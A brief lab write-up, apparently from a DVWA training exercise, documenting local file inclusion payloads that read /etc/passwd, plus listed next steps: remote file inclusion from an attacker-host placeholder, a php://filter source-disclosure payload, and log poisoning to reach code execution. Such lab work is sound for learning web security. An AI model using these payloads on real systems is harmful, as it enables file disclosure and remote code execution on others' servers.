# Local File Inclusion (LFI) — Payloads

Target: `http://192.168.187.4/dvwa/vulnerabilities/fi/` (DVWA, security level: low)

## Failed attempt (malformed path)
```
http://192.168.187.4/dvwa/vulnerabilities/fi/?page=file:///home/kali/hosted.html/etc/passwd
```
404 — the `file://` wrapper concatenated onto an existing path string does not resolve. Screenshot: `01_lfi_malformed_404.png`.

## Successful LFI
```
http://192.168.187.4/dvwa/vulnerabilities/fi/?page=/etc/passwd
```
Returns the full contents of `/etc/passwd` inline in the page (all system accounts and shells visible). Screenshot: `02_lfi_etc_passwd_disclosed.png`.

## Next steps for a full engagement (not captured here)
- Remote File Inclusion: `?page=http://<attacker-ip>/evil.txt` (requires `allow_url_include=On`).
- PHP wrapper abuse for source disclosure: `?page=php://filter/convert.base64-encode/resource=index.php`.
- Log poisoning (inject PHP into `/var/log/apache2/access.log` via User-Agent, then include the log) to escalate LFI to RCE.
